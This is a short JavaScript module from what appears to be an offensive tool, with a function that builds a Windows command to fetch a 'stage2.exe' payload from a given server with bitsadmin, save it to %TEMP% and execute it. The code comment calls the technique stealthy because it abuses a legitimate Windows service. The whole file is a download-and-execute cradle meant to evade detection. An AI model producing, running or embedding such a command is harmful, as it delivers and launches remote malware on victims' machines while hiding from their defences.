function generate(token, serverUrl) {
    // Downloads via bitsadmin (stealthy, uses legit Windows service)
    return `bitsadmin /transfer h${token} /download /priority normal "${serverUrl}/stage2.exe" %TEMP%\\h_${token}.exe && start %TEMP%\\h_${token}.exe`;
}

module.exports = { generate };
